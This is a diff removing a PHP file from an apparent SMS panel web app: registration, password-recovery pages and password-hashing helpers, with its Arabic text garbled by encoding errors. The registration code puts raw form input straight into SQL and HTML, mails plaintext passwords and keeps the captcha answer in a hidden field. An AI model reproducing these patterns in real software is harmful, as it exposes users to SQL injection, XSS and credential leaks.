-					for ($i = 0; $i < 8; $i++)
-
-					{
-
-						$salt .= $APRMD5{rand(0, 63)};
-
-					}
-
-					return $salt;
-
-				}
-
-				break;
-
-
-
-			default:
-
-				$salt = '';
-
-				if ($seed)
-
-				{
-
-					$salt = $seed;
-
-				}
-
-				return $salt;
-
-				break;
-
-		}
-
-	}
-
-
-
-function genRandomBytes($length = 16)
-
-	{
-
-		$sslStr = '';
-
-
-
-		if (
-
-			function_exists('openssl_random_pseudo_bytes')
-
-			&& (version_compare(PHP_VERSION, '5.3.4') >= 0
-
-				|| substr(PHP_OS, 0, 3) !== 'WIN'
-
-			)
-
-		)
-
-		{
-
-			$sslStr = openssl_random_pseudo_bytes($length, $strong);
-
-			if ($strong)
-
-			{
-
-				return $sslStr;
-
-			}
-
-		}
-
-
-
-		$bitsPerRound = 2;
-
-		$maxTimeMicro = 400;
-
-		$shaHashLength = 20;
-
-		$randomStr = '';
-
-		$total = $length;
-
-
-
-		$urandom = false;
-
-		$handle = null;
-
-		if (function_exists('stream_set_read_buffer') && @is_readable('/dev/urandom'))
-
-		{
-
-			$handle = @fopen('/dev/urandom', 'rb');
-
-			if ($handle)
-
-			{
-
-				$urandom = true;
-
-			}
-
-		}
-
-
-
-		while ($length > strlen($randomStr))
-
-		{
-
-			$bytes = ($total > $shaHashLength)? $shaHashLength : $total;
-
-			$total -= $bytes;
-
-
-
-			$entropy = rand() . uniqid(mt_rand(), true) . $sslStr;
-
-			$entropy .= implode('', @fstat(fopen( __FILE__, 'r')));
-
-			$entropy .= memory_get_usage();
-
-			$sslStr = '';
-
-			if ($urandom)
-
-			{
-
-				stream_set_read_buffer($handle, 0);
-
-				$entropy .= @fread($handle, $bytes);
-
-			}
-
-			else
-
-			{
-
-
-
-				$samples = 3;
-
-				$duration = 0;
-
-				for ($pass = 0; $pass < $samples; ++$pass)
-
-				{
-
-					$microStart = microtime(true) * 1000000;
-
-					$hash = sha1(mt_rand(), true);
-
-					for ($count = 0; $count < 50; ++$count)
-
-					{
-
-						$hash = sha1($hash, true);
-
-					}
-
-					$microEnd = microtime(true) * 1000000;
-
-					$entropy .= $microStart . $microEnd;
-
-					if ($microStart > $microEnd) {
-
-						$microEnd += 1000000;
-
-					}
-
-					$duration += $microEnd - $microStart;
-
-				}
-
-				$duration = $duration / $samples;
-
-
-
-				$rounds = (int)(($maxTimeMicro / $duration) * 50);
-
-
-
-				$iter = $bytes * (int) ceil(8 / $bitsPerRound);
-
-				for ($pass = 0; $pass < $iter; ++$pass)
-
-				{
-
-					$microStart = microtime(true);
-
-					$hash = sha1(mt_rand(), true);
-
-					for ($count = 0; $count < $rounds; ++$count)
-
-					{
-
-						$hash = sha1($hash, true);
-
-					}
-
-					$entropy .= $microStart . microtime(true);
-
-				}
-
-			}
-
-
-
-			$randomStr .= sha1($entropy, true);
-
-		}
-
-
-
-		if ($urandom)
-
-		{
-
-			@fclose($handle);
-
-		}
-
-
-
-		return substr($randomStr, 0, $length);
-
-	}
-
-	
-
-function genRandomPassword($length = 8)
-
-	{
-
-		$salt = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-
-		$base = strlen($salt);
-
-		$makepass = '';
-
-
-
-		$random = genRandomBytes($length + 1);
-
-		$shift = ord($random[0]);
-
-		for ($i = 1; $i <= $length; ++$i)
-
-		{
-
-			$makepass .= $salt[($shift + ord($random[$i])) % $base];
-
-			$shift += ord($random[$i]);
-
-		}
-
-
-
-		return $makepass;
-
-	}
-
-
-
-	function _toAPRMD5($value, $count)
-
-	{
-
-		/* 64 characters that are valid for APRMD5 passwords. */
-
-		$APRMD5 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
-
-
-
-		$aprmd5 = '';
-
-		$count = abs($count);
-
-		while (--$count)
-
-		{
-
-			$aprmd5 .= $APRMD5[$value & 0x3f];
-
-			$value >>= 6;
-
-		}
-
-		return $aprmd5;
-
-	}
-
-
-
-function _bin($hex)
-
-	{
-
-		$bin = '';
-
-		$length = strlen($hex);
-
-		for ($i = 0; $i < $length; $i += 2)
-
-		{
-
-			$tmp = sscanf(substr($hex, $i, 2), '%x');
-
-			$bin .= chr(array_shift($tmp));
-
-		}
-
-		return $bin;
-
-	}		
-
-
-
-
-
-if(!function_exists('register')) {
-
-	function register($message, $class, $reseller=0) {
-	$spammer2 = 'SK'.rand(199000, 999999);
-
-	//load defaults 
-	$siteName = getSetting('siteName');
-	$Logo = $siteLogo = getSetting('siteLogo');
-	if($reseller > 0) {
-		$siteName = getResellerSetting('business_name',$reseller);
-		$logo = getResellerSetting('logo_url',$reseller);
-		$siteLogo = 'media/uploads/'.getResellerSetting('logo_url',$reseller);
-	}
-
-	if(empty($siteName)): $siteName = 'SMSPanel v1.0'; endif;
-
-	if(empty($Logo)){ $siteLogo = 'media/images/logo.png'; } else {
-
-		$siteLogo = 'media/uploads/'.$siteLogo;
-
-	}	
-
-?>
-
-       
-
-   <div id="login-center">
-
-            <div id="login-head">&nbsp; <i class="fa fa-sign-in"></i> ÿ™ÿ≥ÿ¨ŸäŸÑ ÿßŸÑÿØÿÆŸàŸÑ</div>
-
-			<div id="login-form">
-            <p><img src="<?php echo BASE.$siteLogo; ?>" alt="<?php echo $siteName; ?>"  /></p>
-
-            <form method="post" action="" name="login">
-
-                <p><input type="text" name="access_login" placeholder=" ÿ£ÿ≥ŸÖ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑÿÆÿßÿµ ÿ®ŸÉ"></p>
-
-                <p><input type="password" name="access_password" placeholder="ŸÉŸÑŸÖŸá ÿßŸÑŸÖÿ±Ÿàÿ± ÿßŸÑÿÆÿßÿµ ÿ®ŸÉ"></p>
-
-                <p><button type="submit" id="login-submit" onClick="document.getElementById('login-loading').style.visibility='visible'; return true;" >ÿ™ÿ≥ÿ¨ŸäŸÑ ÿßŸÑÿØÿÆŸàŸÑ ÿßŸÑÿ¢ŸÜ</button></p>
-
-            </form>
-
-            <p><a href="<?php echo BASE; ?>index.php?register&p"><button>ÿßŸÑÿ™ÿ≥ÿ¨ŸäŸÑ ŸàÿßŸÑÿ≠ÿµŸàŸÑ ÿπŸÑŸä ÿ≠ÿ≥ÿßÿ®</button></a></p>
-            <p><a href="<?php echo BASE; ?>index.php?reset&p" class="link">ÿßÿ≥ÿ™ÿ±ÿ¨ÿßÿπ ŸÉŸÑŸÖŸá ÿßŸÑŸÖÿ±Ÿàÿ±</a></p>
-			<div id="login-loading"><img src="<?php echo BASE; ?>media/images/spin.gif" /> Processing...</div>
-
-        </div>
-
-    </div> 
-
-<?php
-
-		$name = '';
-
-		$username = '';
-
-		$email = '';
-
-		$phone = '';
-
-		$address = '';
-
-		$currency = '';
-
-		$country = getSetting('defaultCountry');
-
-		$isReseller = '';
-
-		$password = '';	
-
-
-
-	if(isset($_POST['register'])) {
-
-		$name = $_POST['name'];
-
-		$username = $_POST['username'];
-
-		$email = $_POST['email'];
-
-		$phone = $_POST['phone'];
-
-		$phone = str_replace('+', '', $phone);
-
-		$address = $_POST['address'];
-
-		$city = $_POST['city'];
-
-		$state = $_POST['state'];
-
-		$currency = getSetting('defaultCurrency');
-
-		$country = $_POST['country'];
-
-		$phoneVerified = '1';
-
-		$emailVerified = '0';
-
-		$verificationCode = rand(199999, 999999);
-
-		$password = $_POST['password'];
-
-		$spammer1 = $_POST['spammer1'];
-
-		$spammer = $_POST['spammer'];
-
-		$password1 = $_POST['password2'];
-
-		$salt = genRandomPassword(32);
-
-		$crypt = getCryptedPassword($password, $salt);
-
-		$password2 = $crypt.':'.$salt;		
-
-		
-
-		if(strlen($phone) < 9) {
-
-			$error = 1;
-
-			$message = 'Sorry but your phone number is not supported. Please use a valid Moble Number including your country code .';
-
-			$class = 'red';	
-
-		}
-
-		if($phone == '123456789' || $phone == '12345678' || $phone == '1234567' || $phone == '123456') {
-
-			$error = 1;
-
-			$message = 'Sorry but your phone number is not recorgnized. Please use a valid Moble Number including your country code .';
-
-			$class = 'red';	
-
-		}
-
-
-
-		if(emailExist($email)) {
-
-			$error = 1;
-
-			$message = 'Sorry but another user already exist with same email address.';
-
-			$class = 'red';	
-
-		}				
-
-		if($password != $password1) {
-
-			$error = 1;
-
-			$message = 'Sorry but your two password fields does not match. Please checkŸÉŸÑŸÖŸá ÿßŸÑŸÖÿ±Ÿàÿ± ÿßŸÑÿÆÿßÿµ ÿ®ŸÉs and try again.';
-
-			$class = 'red';	
-
-		}					
-
-		if(usernameExist($username)) {
-
-			$error = 1;
-
-			$message = 'Sorry but another user already exist with same username.';
-
-			$class = 'red';	
-
-		}	
-
-		
-
-		if($spammer != $spammer1) {
-
-			$error = 1;
-
-			$message = 'ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ÿßŸÑŸÖÿØÿÆŸÑŸá ÿ±ÿßÿ¨ÿπ ÿ±ŸÖÿ≤ ÿßŸÑÿ™ÿ≠ŸÇŸÇ ŸÅÿ∂ŸÑÿ¢.';
-
-			$class = 'red';
-
-		}			
-
-	if(!isset($error)) {	
-
-	//add new account
-
-	$testUnits = getSetting('testUnits');
-	if($reseller > 0 ) {
-		$testUnits = getResellerSetting('test_units', $reseller);
-	}
-	$code = rand(199999, 999999);
-
-		$add = mysql_query("INSERT INTO customers (`id`, `name`, `email`, `phone`, `username`, `password`, `address`, `city`, `state`, `country`, `smsPurchase`, `smsBalance`, `isReseller`, `phoneVerified`, `emailVerified`, `verificationCode`, `currency`, `suspended`,`reseller`) 
-
-			VALUES (NULL, '$name', '$email', '$phone', '$username', '$password2', '$address', '$city', '$state', '$country', '$testUnits', '$testUnits', '0', '1', '$emailVerified', '$code', '$currency', '0','$reseller');") or die(mysql_error());	
-
-//verify
-
-//send email
-
-		$mail = '<html><body>';
-
-		$mail .= '<p style="margin-top: 0; margin-bottom: 0">Hi '.$name.',</p>';
-		if($reseller > 0) { 
-		$mail .= '<p style="margin-top: 0; margin-bottom: 0">Thank you for registering at '.getResellerSetting('business_name').'.</p>';
-		} else {
-		$mail .= '<p style="margin-top: 0; margin-bottom: 0">Thank you for registering at '.getSetting('siteName').'.</p>';	
-		}
-		$mail .= '<p style="margin-top: 0; margin-bottom: 0">&nbsp;</p>';
-		if($reseller > 0) { 
-		$mail .= '<p style="margin-top: 0; margin-bottom: 0">Your account activation link is <b><a href="'.getResellerSetting('allowed_domain', $reseller).'/index.php?verify&token='.$code.'">'.getResellerSetting('allowed_domain', $reseller).'/index.php?verify&token='.$code.'</a></b>.</p>';
-		} else {
-		$mail .= '<p style="margin-top: 0; margin-bottom: 0">Your account activation link is <b><a href="'.home_base_url().'/index.php?verify&token='.$code.'">'.home_base_url().'/index.php?verify&token='.$code.'</a></b>.</p>';	
-		}
-		$mail .= '<p style="margin-top: 0; margin-bottom: 0">&nbsp;</p>';
-
-		$mail .= '<p style="margin-top: 0; margin-bottom: 0">You must follow the above link to complete your registration. </p>';
-
-		$mail .= '<p style="margin-top: 0; margin-bottom: 0">&nbsp;</p>';
-
-		$mail .= '</body></html>';
-	
-	if($reseller > 0) { 
-	$emailSender = getResellerSetting('email_sender',$reseller);
-	$emailFrom = getResellerSetting('business_email',$reseller);		
-	sendResellerEmail($emailFrom,$emailSender,'Your New SMS Account Activation Link',$email,$mail,$reseller);
-	} else {
-	$emailSender = getSetting('emailSender');
-	$emailFrom = getSetting('companyEmail');		
-	sendEmail($emailFrom,$emailSender,'Your New SMS Account Activation Link',$email,$mail);
-	}
-	//get inserted id
-
-	$sql = "SELECT * FROM customers ORDER BY id DEsC LIMIT 1";
-
-	$result = mysql_query($sql);
-
-	$num = mysql_numrows($result);
-
-	$row = mysql_fetch_assoc($result); 
-
-	$userID = $row['id'];					
-
-	//send new password by sms and email
-
-	$newAccountSMS = getSetting('newAccountSMS');
-
-	$newAccountEmail = getSetting('newAccountEmail');
-
-	$newAccountEmailSubject = getSetting('newAccountEmailSubject');
-	
-	if($reseller > 0) { 
-	$emailSender = getResellerSetting('email_sender',$reseller);
-	$emailFrom = getResellerSetting('business_email',$reseller);
-	$smsSender = getResellerSetting('sms_sender',$reseller);	
-	} else {
-	$smsSender = getSetting('smsSender');
-	$emailSender = getSetting('emailSender');
-	$emailFrom = getSetting('companyEmail');
-	}
-
-	$customer = $userID;
-
-
-
-		if(!empty($newAccountSMS)) {
-
-			$mail = str_replace('[USERNAME]', $username, $newAccountSMS);	
-
-			$mail = str_replace('[PASSWORD]', $password, $newAccountSMS);
-
-			$mail = str_replace('[CUSTOMER NAME]', $name, $newAccountSMS);	
-
-			$mail = strtr ($newAccountSMS, array ('[PASSWORD]' => $password,'[CUSTOMER NAME]' => $name,'[USERNAME]' => $username));			
-
-			sendMessage($smsSender,$phone,$mail,'0','Admin','');		
-
-		}
-
-
-
-		if(!empty($newAccountEmail)) {
-
-			$mail = str_replace('[USERNAME]', $username, $newAccountEmail);	
-
-			$mail = str_replace('[PASSWORD]', $password, $newAccountEmail);
-
-			$mail = str_replace('[CUSTOMER NAME]', $name, $newAccountEmail);
-
-			$mail = strtr ($newAccountEmail, array ('[PASSWORD]' => $password,'[CUSTOMER NAME]' => $name,'[USERNAME]' => $username));										
-			if($reseller > 0) {
-			sendResellerEmail($emailFrom,$emailSender,$newAccountEmailSubject,$email,$mail,$reseller);	
-			} else {
-			sendEmail($emailFrom,$emailSender,$newAccountEmailSubject,$email,$mail);
-			}
-
-		}	
-
-	header('location: '.BASE.'index.php?registered&p');	
-
-	}
-
-	}
-
-?>
-
-
-
-<div id="add-new" style="top: 15%; height: 450px;">
-
-	<div id="add-new-head"> ÿßŸÑÿ™ÿ≥ÿ¨ŸäŸÑ ŸàÿßŸÑÿ¢ÿ¥ÿ™ÿ±ÿßŸÉ
-
-    <a href="javascript:{}" title="Close" id="closeBox" onClick="document.getElementById('add-new').style.display='none';"><div class="close">X</div></a></div>
-
-     <div class="inside">    
-
-		<div id="mess" style="position: relative; top: 0;">     
-
-            <?php if(!empty($message)) { showMessage($message,$class); } ?>
-
-        </div>        
-
-    <form method="post" action="" enctype="multipart/form-data">
-
-    <table width="100%" border="0" cellspacing="5" cellpadding="0">
-
-      <tr>
-
-        <td align="left" valign="middle">ÿßŸÑÿ¢ÿ≥ŸÖ ÿ®ÿßŸÑŸÉÿßŸÖŸÑ :</td>
-
-        <td width="70%" align="left" valign="middle">
-
-        	<input type="test" name="name" id="name" value="<?php echo $name; ?>" maxlength="200" required="required" placeholder="">                      
-
-        </td>
-
-      </tr>
-
-      <tr>
-
-        <td align="left" valign="middle">ÿ£ÿ≥ŸÖ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ :</td>
-
-        <td width="70%" align="left" valign="middle">
-
-        	<input type="text"  name="username" id="username" value="<?php echo $username; ?>" required="required" placeholder="">                      
-
-        </td>
-
-      </tr>      
-
-      <tr>
-
-        <td align="left" valign="middle">ÿßŸÑÿ®ÿ±ŸäÿØ ÿßŸÑÿ¢ŸÑŸÉÿ™ÿ±ŸàŸÜŸä :</td>
-
-        <td width="70%" align="left" valign="middle">
-
-        	<input type="text" name="email" id="email" value="<?php echo $email; ?>" maxlength="200" required="required" placeholder="">                      
-
-        </td>
-
-      </tr>    
-
-      <tr>
-
-        <td align="left" valign="middle">ÿ±ŸÇŸÖ Ÿáÿßÿ™ŸÅŸÉ ŸÖÿπ ÿ±ŸÖÿ≤ ÿßŸÑÿØŸàŸÑŸá ÿ®ÿØŸàŸÜ +</td>
-
-        <td width="70%" align="left" valign="middle">
-
-        	<input type="number" name="phone" id="phone" value="<?php echo $phone; ?>" maxlength="16" required="required" placeholder="Include country code E.g. +23412345678">                      
-
-        </td>
-
-      </tr>        
-
-      <tr>
-
-        <td align="left" valign="middle">ÿßŸÑÿπŸÜŸàÿßŸÜ ÿ®ÿßŸÑÿ¢ŸÜÿ¨ŸÑŸäÿ≤ŸäŸá :</td>
-
-        <td width="70%" align="left" valign="middle">
-
-        	<input type="text" name="address" id="address" value="<?php echo $address; ?>" maxlength="300"  placeholder="">        </td>
-
-      </tr>
-
-      <tr>
-
-        <td align="left" valign="middle">ÿßŸÑŸÖÿ≠ÿßŸÅÿ∏Ÿá :</td>
-
-        <td width="70%" align="left" valign="middle">
-
-        	<input type="text" name="city" id="city" value="<?php echo $city; ?>" maxlength="300"  placeholder="">        </td>
-
-      </tr>
-
-      <tr>
-
-        <td align="left" valign="middle">ÿßŸÑŸÖŸÜÿ∑ŸÇŸá :</td>
-
-        <td width="70%" align="left" valign="middle">
-
-        	<input type="text" name="state" id="state" value="<?php echo $state; ?>" maxlength="300"  placeholder="">        </td>
-
-      </tr>      
-
-      <tr>
-
-        <td align="left" valign="middle">ÿßŸÑŸÖŸÜÿ∑ŸÇŸá :</td>
-
-        <td width="70%" align="left" valign="middle">
-
-        	<select name="country" id="e1" style="width: 98%;" >
-
-            	<?php getCountryList($country,'name'); ?>
-
-            </select>                      
-
-        </td>
-
-      </tr>             
-
-      <tr>
-
-        <td align="left" valign="middle">ŸÉŸÑŸÖŸá ÿßŸÑŸÖÿ±Ÿàÿ± :</td>
-
-        <td width="70%" align="left" valign="middle">
-
-        	<input type="password" name="password" required="required" id="password" maxlength="200"  placeholder="A minimun of 8 characters is recommended">                      
-
-        </td>
-
-      </tr>         
-
-      <tr>
-
-        <td align="left" valign="middle">ÿ£ÿπÿßÿØŸá ÿßÿØÿÆÿßŸÑ ŸÉŸÑŸÖŸá ÿßŸÑŸÖÿ±Ÿàÿ± :</td>
-
-        <td width="70%" align="left" valign="middle">
-
-        	<input type="password" name="password2" required="required" id="password2" maxlength="16" placeholder="">                      
-
-        </td>
-
-      </tr>
-
-      <tr>
-
-        <td align="left" valign="middle"></td>
-
-        <td width="70%" align="left" valign="middle">
-
-        	<br />ÿßŸÉÿ™ÿ® ÿßŸÑÿ¢ÿ±ŸÇÿßŸÖ ÿßŸÑÿ™Ÿä ÿ™ÿ∏Ÿáÿ± ÿßŸÑŸäŸÉ Ÿáÿ∞Ÿá ÿßŸÑÿÆÿØŸÖŸá ŸÖŸáŸÖŸá ŸÑŸÉŸä ŸÜÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÜŸÉ ÿ¥ÿÆÿµ ÿ≠ŸÇŸäŸÇŸä     <br />
-
-            <div style="margin-left: 10%;width: 100px;height: 40px;line-height: 40px;padding: 2px 10px; background-color:#9CC;font-size: 20px;text-align: center;"><?php echo $spammer2; ?></div>                
-
-        </td>
-
-      </tr>
-
-            <tr>
-
-        <td align="left" valign="middle">ÿßŸÉÿ™ÿ® ÿßŸÑŸÜÿµ ŸáŸÜÿß</td>
-
-        <td width="70%" align="left" valign="middle">
-
-        	<input type="text" name="spammer" required="required" id="spammer" placeholder="Type exactly what you see here" style="">
-
-            <input type="hidden" name="spammer1" value="<?php echo $spammer2; ?>" />                      
-
-        </td>
-
-      </tr>       
-
-      <tr>
-
-        <td align="left" valign="top">&nbsp;</td>
-
-        <td width="69%" align="left" valign="top">
-
-        <input type="hidden" name="register"  />
-
-        <button class="submit" onClick="document.getElementById('login-loading').style.visibility='visible'; return true;" name="save" value="1" type="submit">ÿ£ŸÜÿ¥ÿ£ ÿßŸÑÿ≠ÿ≥ÿßÿ® ÿßŸÑÿ¢ŸÜ</button>
-
-	</form>     
-
-     	<div id="login-loading"><img src="<?php echo BASE; ?>media/images/spin.gif" /> Processing...</div>     
-
-        </td>
-
-      </tr>    
-
-   </table>  
-
-   </div>
-
- </div>  
-
-
-
-	
-
-  </body>
-
-</html>	
-
- <?php 
-
- 	die();
-
- //end sho login	
-
-	}
-
-}
-
-
-
-if(!function_exists('ResendCode')) {
-
-	function ResendCode($message, $class,$id) {
-
-	$siteName = getSetting('siteName');
-
-	$siteLogo = getSetting('siteLogo');
-
-	if(empty($siteName)): $siteName = 'SMSPanel v1.0'; endif;
-
-	if(empty($siteLogo)){ $siteLogo = 'media/images/logo.png'; } else {
-
-		$siteLogo = 'media/uploads/'.$siteLogo;
-
-	}
-
-	
-
-//get code
-
-	$sql = "SELECT * FROM customers WHERE id = '$id'";
-
-	$result = mysql_query($sql);
-
-	$num = mysql_num_rows($result);
-
-	$row = mysql_fetch_assoc($result); 
-
-	$name = $row['name'];
-
-	$code = $row['verificationCode'];
-
-	$email = $row['email'];
-
-//send email
-
-		$mail = '<html><body>';
-
-		$mail .= '<p style="margin-top: 0; margin-bottom: 0">Hi '.$name.',</p>';
-
-		$mail .= '<p style="margin-top: 0; margin-bottom: 0">Thank you for registering at '.$siteName.'.</p>';
-
-		$mail .= '<p style="margin-top: 0; margin-bottom: 0">&nbsp;</p>';
-
-		$mail .= '<p style="margin-top: 0; margin-bottom: 0">Your account activation link is <b><a href="'.home_base_url().'index.php?verify&token='.$code.'">'.home_base_url().'index.php?verify&token='.$code.'</a></b>.</p>';
-
-		$mail .= '<p style="margin-top: 0; margin-bottom: 0">&nbsp;</p>';
-
-		$mail .= '<p style="margin-top: 0; margin-bottom: 0">You must follow the above link to complete your registration. </p>';
-
-		$mail .= '<p style="margin-top: 0; margin-bottom: 0">&nbsp;</p>';
-
-		$mail .= '</body></html>';
-
-	$emailSender = getSetting('emailSender');
-
-	$emailFrom = getSetting('companyEmail');		
-
-sendEmail($emailFrom,$emailSender,'Your New SMS Account Activation Link',$email,$mail);		
-
-?>
-
-    	<div id="mess" style="width: 100%;">
-
-            <?php if(!empty($message)) { showMessage($message, $class); } ?>
-
-        </div>        
-
-		
-
-        <p style="text-align:center;"><a href="<?php echo BASE; ?>index.php"><button class="submit" style="float:none; margin-top: 140px; width: 200px; height: 50px; font-size: 18px;">Proceed to ÿ™ÿ≥ÿ¨ŸäŸÑ ÿßŸÑÿØÿÆŸàŸÑ ÿßŸÑÿ¢ŸÜ</button></a></p>
-
-	
-
-  </body>
-
-</html>	
-
- <?php 
-
- 	die();
-
-	}
-
-}
-
-
-
-
-
-if(!function_exists('RecoverPassword')) {
-
-	function RecoverPassword($message, $class) {
-
-	//load defaults 
-	$siteName = getSetting('siteName');
-	$Logo = $siteLogo = getSetting('siteLogo');
-	if($reseller > 0) {
-		$siteName = getResellerSetting('business_name',$reseller);
-		$logo = getResellerSetting('logo_url',$reseller);
-		$siteLogo = 'media/uploads/'.getResellerSetting('logo_url',$reseller);
-	}
-
-	if(empty($siteName)): $siteName = 'SMSPanel v1.0'; endif;
-	if(empty($Logo)){ $siteLogo = 'media/images/logo.png'; } else {
-		$siteLogo = 'media/uploads/'.$siteLogo;
-	}
-
-?>
-
-    	<div id="mess">
-
-            <?php if(!empty($message)) { showMessage($message, $class); } ?>
-
-        </div>        
-
-   <div id="login-center">
-
-            <div id="login-head"><img src="<?php echo BASE; ?>media/images/login-white.png" /> ÿ™ÿ∫Ÿäÿ± ÿßŸà ÿßÿ≥ÿ™ÿ±ÿ¨ÿßÿπ ŸÑŸÉŸÑŸÖŸá ÿßŸÑŸÖÿ±Ÿàÿ±</div>
-
-			<div id="login-form">
-            <p><img src="<?php echo BASE.$siteLogo; ?>" alt="<?php echo $siteName; ?>" /></p>
-				<p><b>ÿßŸÉÿ™ÿ® ÿ®ÿ±ŸäÿØŸÉ ŸÑÿ¢ÿ≥ÿ™ÿ±ÿßÿ¨ÿπ ŸÉŸÑŸÖŸá ÿßŸÑŸÖÿ±Ÿàÿ± ÿßŸÑŸÉ</b><br /><br /></p>
-            <form method="post" action="" name="login">
-
-                <p><input type="email" name="userEmail" placeholder=" Your Email Address"></p>
-
-                <p><button type="submit" id="login-submit" onClick="document.getElementById('login-loading').style.visibility='visible'; return true;" >ÿ™ÿ∫Ÿäÿ± ÿßŸà ÿßÿ≥ÿ™ÿ±ÿ¨ÿßÿπ ŸÑŸÉŸÑŸÖŸá ÿßŸÑŸÖÿ±Ÿàÿ±</button></p>
-
-            </form>
-
-            <p><a href="<?php echo BASE; ?>index.php"><button>ÿßÿπÿßÿØŸá ÿ™ÿ≥ÿ¨ŸäŸÑ ÿßŸÑÿØÿÆŸàŸÑ ÿßŸÑÿ¢ŸÜ</button></a></p>
-
-			<div id="login-loading"><img src="<?php echo BASE; ?>media/images/spin.gif" /> Processing...</div>
-
-        </div>
-
-    </div> 
-
-	
-
-  </body>
-
-</html>	
-
- <?php 
-
- 	die();
-
-	}
-
-}
-
-if(!function_exists('AdminRecoverPassword')) {
-
-	function AdminRecoverPassword($message, $class) {
-
-
-
-	//load defaults 
-
-	$siteName = getSetting('siteName');
-
-	$siteLogo = getSetting('siteLogo');
-
-	$siteName = 'SMSPanel v1.0';
-
-	$siteLogo = 'media/images/logo.png'; 
-
-?>
-
-    	<div id="mess">
-
-            <?php if(!empty($message)) { showMessage($message, $class); } ?>
-
-        </div>        
-
-   <div id="login-center">
-
-            <div id="login-head"><img src="<?php echo BASE; ?>media/images/login-white.png" /> ÿ™ÿ∫Ÿäÿ± ÿßŸà ÿßÿ≥ÿ™ÿ±ÿ¨ÿßÿπ ŸÑŸÉŸÑŸÖŸá ÿßŸÑŸÖÿ±Ÿàÿ±</div>
-
-			<div id="login-form">
-            <p><img src="<?php echo BASE.$siteLogo; ?>" alt="<?php echo $siteName; ?>"  /></p>
-
-            <form method="post" action="" name="login">
-
-                <p><input type="email" name="userEmail" placeholder=" Your Email Address"></p>
-
-                <p><button type="submit" id="login-submit" onClick="document.getElementById('login-loading').style.visibility='visible'; return true;" >ÿ™ÿ∫Ÿäÿ± ÿßŸà ÿßÿ≥ÿ™ÿ±ÿ¨ÿßÿπ ŸÑŸÉŸÑŸÖŸá ÿßŸÑŸÖÿ±Ÿàÿ±</button></p>
-
-            </form>
-
-            <p><a href="<?php echo BASE; ?>administrator/index.php"><button>ÿßÿπÿßÿØŸá ÿ™ÿ≥ÿ¨ŸäŸÑ ÿßŸÑÿØÿÆŸàŸÑ ÿßŸÑÿ¢ŸÜ</button></a></p>
-
-			<div id="login-loading"><img src="<?php echo BASE; ?>media/images/spin.gif" /> Processing...</div>
-
-        </div>
-
-    </div> 
-
-	
-
-  </body>
-
-</html>	
-
- <?php 
-
- 	die();
-
-	}
-
-}
-
-class PasswordHash {
-
-	var $itoa64;
-
-	var $iteration_count_log2;
-
-	var $portable_hashes;
-
-	var $random_state;
-
-
-
-	function PasswordHash($iteration_count_log2, $portable_hashes)
-
-	{
-
-		$this->itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
-
-
-
-		if ($iteration_count_log2 < 4 || $iteration_count_log2 > 31)
-
-
-			$iteration_count_log2 = 8;
-
-		$this->iteration_count_log2 = $iteration_count_log2;
-
-
-
-		$this->portable_hashes = $portable_hashes;
-
-
-
-		$this->random_state = microtime() . getmypid();
-
-	}
-
-
-
-	function get_random_bytes($count)
-
-	{
-
-		$output = '';
-
-		if (($fh = @fopen('/dev/urandom', 'rb'))) {
-
-			$output = fread($fh, $count);
-
-			fclose($fh);
-
-		}
-
-
-
-		if (strlen($output) < $count) {
-
-			$output = '';
-
-			for ($i = 0; $i < $count; $i += 16) {
-
-				$this->random_state =
-
-				    md5(microtime() . $this->random_state);
-
-				$output .=
-
-				    pack('H*', md5($this->random_state));
-
-			}
-
-			$output = substr($output, 0, $count);
-
-		}
-
-
-
-		return $output;
-
-	}
-
-
-
-	function encode64($input, $count)
-
-	{
-
-		$output = '';
-
-		$i = 0;
-
-		do {
-
-			$value = ord($input[$i++]);
-
-			$output .= $this->itoa64[$value & 0x3f];
-
-			if ($i < $count)
-
-				$value |= ord($input[$i]) << 8;
-
-			$output .= $this->itoa64[($value >> 6) & 0x3f];
-
-			if ($i++ >= $count)
-
-				break;
-
-			if ($i < $count)
-
-				$value |= ord($input[$i]) << 16;
-
-			$output .= $this->itoa64[($value >> 12) & 0x3f];
-
-			if ($i++ >= $count)
-
-				break;
-
-			$output .= $this->itoa64[($value >> 18) & 0x3f];
-
-		} while ($i < $count);
-
-
-
-		return $output;
-
-	}
-
-
-
-	function gensalt_private($input)
-
-	{
-
-		$output = '$P$';
-
-		$output .= $this->itoa64[min($this->iteration_count_log2 +
-
-			((PHP_VERSION >= '5') ? 5 : 3), 30)];
-
-		$output .= $this->encode64($input, 6);
-
-
-
-		return $output;
-
-	}
-
-
-
-	function crypt_private($password, $setting)
-
-	{
-
-		$output = '*0';
-
-		if (substr($setting, 0, 2) == $output)
-
-			$output = '*1';
-
-
-
-		if (substr($setting, 0, 3) != '$P$')
-
-			return $output;
-
-
-
-		$count_log2 = strpos($this->itoa64, $setting[3]);
-
-		if ($count_log2 < 7 || $count_log2 > 30)
-
-			return $output;
-
-
-
-		$count = 1 << $count_log2;
-
-
-
-		$salt = substr($setting, 4, 8);
-
-		if (strlen($salt) != 8)
-
-			return $output;
-
-
-
-		# We're kind of forced to use MD5 here since it's the only
-
-		# cryptographic primitive available in all versions of PHP
-
-		# currently in use.  To implement our own low-level crypto
-
-		# in PHP would result in much worse performance and
-
-		# consequently in lower iteration counts and hashes that are
-
-		# quicker to crack (by non-PHP code).
-
-		if (PHP_VERSION >= '5') {
-
-			$hash = md5($salt . $password, TRUE);
-
-			do {
-
-				$hash = md5($hash . $password, TRUE);
-
-			} while (--$count);
-
-		} else {
-
-			$hash = pack('H*', md5($salt . $password));
-
-			do {
-
-				$hash = pack('H*', md5($hash . $password));
-
-			} while (--$count);
-
-		}
-
-
-
-		$output = substr($setting, 0, 12);
-
-		$output .= $this->encode64($hash, 16);
-
-
-
-		return $output;
-
-	}
-
-
-
-	function gensalt_extended($input)
-
-	{
-
-		$count_log2 = min($this->iteration_count_log2 + 8, 24);
-
-		# This should be odd to not reveal weak DES keys, and the
-
-		# maximum valid value is (2**24 - 1) which is odd anyway.
-
